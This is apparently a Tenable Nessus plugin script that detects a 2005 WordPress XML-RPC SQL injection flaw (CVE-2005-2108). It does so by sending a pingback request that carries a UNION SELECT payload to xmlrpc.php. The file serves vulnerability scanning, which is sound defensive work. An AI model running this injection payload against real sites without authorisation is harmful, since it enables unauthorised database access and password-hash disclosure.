#
# Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(18601);
  script_version("$Revision: 1.27 $");
  script_cvs_date("$Date: 2014/10/01 13:19:36 $");

  script_cve_id("CVE-2005-2108");
  script_osvdb_id(17637);
  script_xref(name:"EDB-ID", value:"1077");

  script_name(english:"WordPress < 1.5.1.3 XMLRPC SQL Injection");
  script_summary(english:"Checks for SQL injection in xmlrpc.php.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of WordPress installed on the remote host is affected by a
SQL injection vulnerability because the bundled XML-RPC library fails
to properly sanitize user-supplied input to the 'xmlrpc.php' script.
An attacker can exploit this flaw to launch SQL injection attacks that
could lead to disclosure of the administrator's password hash or
attacks against the underlying database.

Note that the application is reportedly also affected by multiple
cross-site scripting (XSS) vulnerabilities, multiple path disclosure
vulnerabilities, and a flaw in which a remote attacker can modify the
content of the 'forgotten password' message; however, Nessus has not
tested for these issues.");
  # http://web.archive.org/web/20051230035642/http://www.gulftech.org/?node=research&article_id=00085-06282005
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8ec4b624");
  script_set_attribute(attribute:"solution", value:"Upgrade to WordPress version 1.5.1.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/06/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2005/06/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/07/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2014 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Check whether the script exists.
r = http_send_recv3(method: "GET", item:dir + "/xmlrpc.php", port:port, exit_on_fail: TRUE);

# If it does...
if ("XML-RPC server accepts POST requests only" >< r[2])
{
  # Find an existing post.
  res = http_send_recv3(method : "GET", item:dir + "/index.php", port:port, exit_on_fail: TRUE);

  pat = '/\\?p=([0-9]+)" rel="bookmark"';
  matches = egrep(pattern:pat, string:res);
  if (matches)
  {
    foreach match (split(matches))
    {
      match = chomp(match);
      post = eregmatch(pattern:pat, string:match);
      if (!isnull(post))
      {
        post = post[1];
        # We're only interested in the first post we find.
        break;
      }
    }
  }

  # If we have a post, try to exploit the flaw.
  if (post)
  {
    postdata =
      '<?xml version="1.0"?>' +
      "<methodCall>" +
        "<methodName>pingback.ping</methodName>" +
          "<params>" +
            # nb: we can only determine success based on whether any
            #     rows were returned. The exploit used here, while
            #     lame, is certain to return one.
            # nb^2: this only works if the MySQL version supports
            #       UNION (ie, >= 4.0).
            "<param><value><string>" +SCRIPT_NAME+ "' UNION SELECT 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--</string></value></param>" +
            "<param><value><string>http://" +get_host_name()+ dir + "/?p=" +post+ "#1</string></value></param>" +
            "<param><value><string>admin</string></value></param>" +
          "</params>" +
        "</methodCall>";
    r = http_send_recv3(method: "POST", item: dir+"/xmlrpc.php", version: 11, port: port, exit_on_fail: TRUE, content_type: "text/xml", data: postdata);

    # There's a problem if we see "The pingback has already been registered".
    if ("The pingback has already been registered" >< r[2])
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      security_hole(port);
      exit(0);
    }
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
